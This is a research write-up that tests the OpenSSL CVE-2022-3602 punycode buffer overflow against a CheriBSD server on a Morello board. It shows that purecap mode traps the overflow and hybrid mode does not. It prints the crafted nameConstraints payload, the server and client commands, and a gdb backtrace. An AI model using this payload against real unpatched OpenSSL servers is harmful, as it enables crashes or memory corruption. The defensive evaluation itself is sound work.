# OpenSSL punny_code vulnerability CVE-2022-3602

The below tests are based on the proof of concept presented in [1].

The malicious client initiates a TLS connection with a vulnerable server. Both the client and the server use OpenSSL 3.0.2 15 Mar 2022 (Library: OpenSSL 3.0.2 15 Mar 2022). The server runs on a Morello board with CheriBSD and the client runs on a Ubuntu PC.

The malicious client crafts a CA with the following payload:
```
nameConstraints = permitted;email:xn--3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2ba@example.com
```

The below backtrace is from the gdb run of openssl in purecap after it encounters a security exception:

```console
cheribsd$ gdb --args /usr/local/bin/openssl s_server -accept 3000 -CAfile certs/cacert.pem -cert certs/server.cert.pem -key certs/server.key.pem  -state -verify 1

verify depth is 1
Using default temp DH parameters
ACCEPT
SSL_accept:before SSL initialization
SSL_accept:before SSL initialization
SSL_accept:SSLv3/TLS read client hello
SSL_accept:SSLv3/TLS write server hello
SSL_accept:SSLv3/TLS write change cipher spec
SSL_accept:TLSv1.3 write encrypted extensions
SSL_accept:SSLv3/TLS write certificate request
SSL_accept:SSLv3/TLS write certificate
SSL_accept:TLSv1.3 write server certificate verify
SSL_accept:SSLv3/TLS write finished
SSL_accept:TLSv1.3 early data
SSL_accept:TLSv1.3 early data
depth=1 C = FR, ST = IdF, L = Paris, O = DataDog, OU = SecurityResearch, CN = KraftCert
verify error:num=19:self-signed certificate in certificate chain
verify return:1
depth=1 C = FR, ST = IdF, L = Paris, O = DataDog, OU = SecurityResearch, CN = KraftCert
verify return:1
depth=0 C = FR, ST = IdF, O = DataDog, OU = SecurityResearch, CN = MaliciousClientCert
verify return:1

Program received signal SIGPROT, CHERI protection violation
Capability bounds fault.
0x0000000040cf99c4 in memmove (dst0=0xfffffff7c62c [rwRW,0xfffffff7be34-0xfffffff7c634], src0=<optimized out>, length=12)
    at /local/scratch/jenkins/workspace/CheriBSD-pipeline_releng_22.05/cheribsd/lib/libc/string/bcopy.c:143
143	/local/scratch/jenkins/workspace/CheriBSD-pipeline_releng_22.05/cheribsd/lib/libc/string/bcopy.c: No such file or directory.
(gdb) backtrace
#0  0x0000000040cf99c4 in memmove (dst0=0xfffffff7c62c [rwRW,0xfffffff7be34-0xfffffff7c634], src0=<optimized out>, length=12)
    at /local/scratch/jenkins/workspace/CheriBSD-pipeline_releng_22.05/cheribsd/lib/libc/string/bcopy.c:143
#1  0x000000004082d2dc in ossl_punycode_decode (
    pEncoded=0x4131d084 [rwRW,0x4131d080-0x4131d2a2] "3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5"..., enc_len=537, 
    pDecoded=0xfffffff7be34 [rwRW,0xfffffff7be34-0xfffffff7c634], pout_length=0xfffffff7be14 [rwRW,0xfffffff7be14-0xfffffff7be18])
    at crypto/punycode.c:187
#2  0x000000004082d878 in ossl_a2ulabel (
    in=0x4131d080 [rwRW,0x4131d080-0x4131d2a2] "xn--3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-w"..., 
    out=0xfffffff7c7e0 [rwRW,0xfffffff7c7e0-0xfffffff7c8e0] "", outlen=0xfffffff7c7d8 [rwRW,0xfffffff7c7d8-0xfffffff7c7e0]) at crypto/punycode.c:283
#3  0x0000000040907f60 in nc_email_eai (emltype=0x4127d740 [rwRW,0x4127d740-0x4127d760], base=0x4140f490 [rwRW,0x4140f490-0x4140f4c0])
    at crypto/x509/v3_ncons.c:673
#4  0x0000000040907b24 in nc_match_single (gen=0x4127d700 [rwRW,0x4127d700-0x4127d720], base=0x4127d7e0 [rwRW,0x4127d7e0-0x4127d800])
    at crypto/x509/v3_ncons.c:539
#5  0x0000000040906c5c in nc_match (gen=0x4127d700 [rwRW,0x4127d700-0x4127d720], nc=0x4127d7c0 [rwRW,0x4127d7c0-0x4127d7e0]) at crypto/x509/v3_ncons.c:500
#6  0x00000000409068b4 in NAME_CONSTRAINTS_check (x=0x412c8900 [rwRW,0x412c8900-0x412c8b90], nc=0x4127d7c0 [rwRW,0x4127d7c0-0x4127d7e0])
    at crypto/x509/v3_ncons.c:303
#7  0x0000000040932794 in check_name_constraints (ctx=0x4131d300 [rwRW,0x4131d300-0x4131d510]) at crypto/x509/x509_vfy.c:738
#8  0x000000004092b6c4 in verify_chain (ctx=0x4131d300 [rwRW,0x4131d300-0x4131d510]) at crypto/x509/x509_vfy.c:233
#9  0x000000004092ae70 in X509_verify_cert (ctx=0x4131d300 [rwRW,0x4131d300-0x4131d510]) at crypto/x509/x509_vfy.c:295
#10 0x0000000040360d4c in ssl_verify_cert_chain (s=0x41410000 [rwRW,0x41410000-0x414128d0], sk=0x412aec40 [rwRW,0x412aec40-0x412aec80])
    at ssl/ssl_cert.c:436
#11 0x00000000403fdbfc in tls_process_client_certificate (s=0x41410000 [rwRW,0x41410000-0x414128d0], 
    pkt=0xfffffff7d640 [rwRW,0xfffffff7d640-0xfffffff7d660]) at ssl/statem/statem_srvr.c:3521
#12 0x00000000403fc5c4 in ossl_statem_server_process_message (s=0x41410000 [rwRW,0x41410000-0x414128d0], 
    pkt=0xfffffff7d640 [rwRW,0xfffffff7d640-0xfffffff7d660]) at ssl/statem/statem_srvr.c:1196
#13 0x00000000403db3d0 in read_state_machine (s=0x41410000 [rwRW,0x41410000-0x414128d0]) at ssl/statem/statem.c:647
#14 0x00000000403da7b0 in state_machine (s=0x41410000 [rwRW,0x41410000-0x414128d0], server=1) at ssl/statem/statem.c:442
#15 0x00000000403daaa8 in ossl_statem_accept (s=0x41410000 [rwRW,0x41410000-0x414128d0]) at ssl/statem/statem.c:270
#16 0x00000000403755bc in SSL_do_handshake (s=0x41410000 [rwRW,0x41410000-0x414128d0]) at ssl/ssl_lib.c:3921
#17 0x00000000403753e4 in SSL_accept (s=0x41410000 [rwRW,0x41410000-0x414128d0]) at ssl/ssl_lib.c:1735
#18 0x000000000020280c in init_ssl_connection (con=0x41410000 [rwRW,0x41410000-0x414128d0]) at apps/s_server.c:2845
#19 0x0000000000200d38 in sv_body (s=4, stype=1, prot=0, context=0x0) at apps/s_server.c:2709
#20 0x0000000000244ab0 in do_server (accept_sock=0x299734 <accept_socket> [rwRW,0x299734-0x299738], host=0x0, 
    port=0x412381f8 [rwRW,0x412381f8-0x412381fd] "3000", family=0, type=1, protocol=0, cb=0x1ff5f1 <sv_body+1> [rxRE,0x100000-0x2a9200] (sentry), 
    context=0x0, naccept=-1, bio_s_out=0x4126bc00 [rwRW,0x4126bc00-0x4126bcf0]) at apps/lib/s_socket.c:384
#21 0x00000000001fba0c in s_server_main (argc=0, argv=0xffffbff7f5e0 [rwRW,0xffffbff7f5d0-0xffffbff7f6b0]) at apps/s_server.c:2226
#22 0x00000000001d01cc in do_cmd (prog=0x41274460 [rwRW,0x41274460-0x41274530], argc=12, argv=0xffffbff7f5e0 [rwRW,0xffffbff7f5d0-0xffffbff7f6b0])
    at apps/openssl.c:418
#23 0x00000000001cfc1c in main (argc=12, argv=0xffffbff7f5e0 [rwRW,0xffffbff7f5d0-0xffffbff7f6b0]) at apps/openssl.c:298
(gdb) 
```

From the above run it can be observed that there's a CHERI protection violation in `ossl_punycode_decode` with the input presented in the payload of the CA.

The client run is given below:

```console
cheribsd$ openssl s_client -connect x.y.z.w:3000 -key certs/client.key.pem  -cert certs/client.cert.pem -CAfile certs/cacert.pem -state

CONNECTED(00000003)
SSL_connect:before SSL initialization
SSL_connect:SSLv3/TLS write client hello
SSL_connect:SSLv3/TLS write client hello
SSL_connect:SSLv3/TLS read server hello
Can't use SSL_get_servername
SSL_connect:TLSv1.3 read encrypted extensions
SSL_connect:SSLv3/TLS read server certificate request
depth=1 C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA
verify error:num=19:self-signed certificate in certificate chain
verify return:1
depth=1 C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA
verify return:1
depth=0 C = US, ST = NY, O = DataDog, OU = SecurityResearch, CN = server
verify return:1
SSL_connect:SSLv3/TLS read server certificate
SSL_connect:TLSv1.3 read server certificate verify
SSL_connect:SSLv3/TLS read finished
SSL_connect:SSLv3/TLS write change cipher spec
SSL_connect:SSLv3/TLS write client certificate
SSL_connect:SSLv3/TLS write certificate verify
SSL_connect:SSLv3/TLS write finished
---
Certificate chain
 0 s:C = US, ST = NY, O = DataDog, OU = SecurityResearch, CN = server
   i:C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
   v:NotBefore: Nov 11 16:45:40 2022 GMT; NotAfter: May 19 16:45:40 2027 GMT
 1 s:C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA
   i:C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
   v:NotBefore: Nov 11 16:45:27 2022 GMT; NotAfter: Nov  8 16:45:27 2032 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIESjCCAzKgAwIBAgIBATANBgkqhkiG9w0BAQsFADBmMQswCQYDVQQGEwJVUzEL
MAkGA1UECAwCTlkxDDAKBgNVBAcMA05ZQzEQMA4GA1UECgwHRGF0YURvZzEZMBcG
A1UECwwQU2VjdXJpdHlSZXNlYXJjaDEPMA0GA1UEAwwGUm9vdENBMB4XDTIyMTEx
MTE2NDU0MFoXDTI3MDUxOTE2NDU0MFowWDELMAkGA1UEBhMCVVMxCzAJBgNVBAgM
Ak5ZMRAwDgYDVQQKDAdEYXRhRG9nMRkwFwYDVQQLDBBTZWN1cml0eVJlc2VhcmNo
MQ8wDQYDVQQDDAZzZXJ2ZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
AQCKQYWsjzdTriGdFJPotaVvDCvKj4M7x0EoK6a+kUw8m7ZUx9dY8PTLMEJQCoRD
A3AHG392VxlOpjsBDP1pbBlWlpVd3gtOWCwzD8Ynr7LvnWopnjCtKxzwOqHB30FB
1+QjJgfK6q1Op810W/z8TWyYgxJdYbw9jiPz33qigTRinW4m4LqQW1jlnIzx/shG
zVJoAgQbVWr2QvBjkpYHnknIWog67VjAdZIa5YI6uyqqui/hGhCMoo1Rllp/asZ+
Ty/eSFoGo+DnCeAOkgAzQa6Uq1xsE7QzMeU1hicskqgdMajEvWrqIhJ18N5EvB48
KD9e27ThKKqfHW5CyaaB85KJAgMBAAGjggEPMIIBCzAMBgNVHRMBAf8EAjAAMB0G
A1UdDgQWBBTyKzovS+qCMzBd4yU5E8j0/nzCuTCBowYDVR0jBIGbMIGYgBTs1/q5
Gj+N3mk/mHeLyrTkwlu9eKFqpGgwZjELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAk5Z
MQwwCgYDVQQHDANOWUMxEDAOBgNVBAoMB0RhdGFEb2cxGTAXBgNVBAsMEFNlY3Vy
aXR5UmVzZWFyY2gxDzANBgNVBAMMBlJvb3RDQYIUW/Ka5OiVXoUJpWWBqC/bnts/
Th0wEQYJYIZIAYb4QgEBBAQDAgZAMA4GA1UdDwEB/wQEAwIFoDATBgNVHSUEDDAK
BggrBgEFBQcDATANBgkqhkiG9w0BAQsFAAOCAQEAi3RVc7s2JIWX9rwXI+fW0C80
Z7kfT7Dn6S1WZdYAELnmlfSiZ8BIfXqE3ZN60lYdUfq0o5YbSyXmv5wRXb5ZLFOG
yZ9nFc+RfU0RZhaQx9rW01DAcJPezufZ8d4zr0s62e4V9k2FKGPaKGygSBnSK385
M6c0ejTXyISDUYBEoMNvBnE/kNSal30f9quzqRjtD/9xpkDBW3q0osQ1/vsAyxiq
csVPmyCcZzdgihK/eHEHPQnr9hZqapzQCCZScGSUWaV22EP4nuqSf6LqlrFTtFWL
P43R0H7LuJK34ts/o8HwPPCRLiZ95r/zTH2+n/nvkgBnAWn8uwnykEr4oKu3hA==
-----END CERTIFICATE-----
subject=C = US, ST = NY, O = DataDog, OU = SecurityResearch, CN = server
issuer=C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA
---
Acceptable client certificate CA names
C = US, ST = NY, L = NYC, O = DataDog, OU = SecurityResearch, CN = RootCA
Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:Ed25519:Ed448:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA224:RSA+SHA224
Shared Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:Ed25519:Ed448:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512
Peer signing digest: SHA256
Peer signature type: RSA-PSS
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 2787 bytes and written 3277 bytes
Verification error: self-signed certificate in certificate chain
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Server public key is 2048 bit
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 19 (self-signed certificate in certificate chain)
---
```
No such exception violation was seen in running OpenSSL in hybrid mode.

## Conclusions
OpenSSL server for CheriBSD on UTF8 payload fails with `Program received signal SIGPROT, CHERI protection violation` in purecap mode. This confirms the findings from CVE-2022-3602 that the `ossl_punycode_decode` function has a buffer overflow vulnerability. Similar tests as in [2] were run for the `ossl_punycode_decode` and `ossl_a2ulabel` and in each of the cases the Cheri system issued a protection violation signal. Another result is that the hybrid mode doesn't offer similar protection as purecap mode.

## References
[1] https://github.com/DataDog/security-labs-pocs/tree/main/proof-of-concept-exploits/openssl-punycode-vulnerability/malicious_client

[2] https://securitylabs.datadoghq.com/articles/openssl-november-1-vulnerabilities/#updates-made-to-this-post
